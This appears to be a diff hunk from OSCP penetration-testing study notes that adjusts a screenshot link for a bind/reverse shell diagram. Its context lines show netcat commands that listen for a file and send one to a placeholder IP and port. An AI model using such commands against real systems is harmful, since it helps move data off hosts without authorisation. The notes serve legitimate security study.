@@ -26,10 +26,7 @@ nc -nlvp <[PORT]> > <[FILE]>
 
 nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 
-![ScreenShot](https://raw.github.com/{username}/{repository}/{branch}/{path})
-
-
-![ScreenShot](https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png)
+![ScreenShot](https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png {width=40px height=400px})
 
 
 
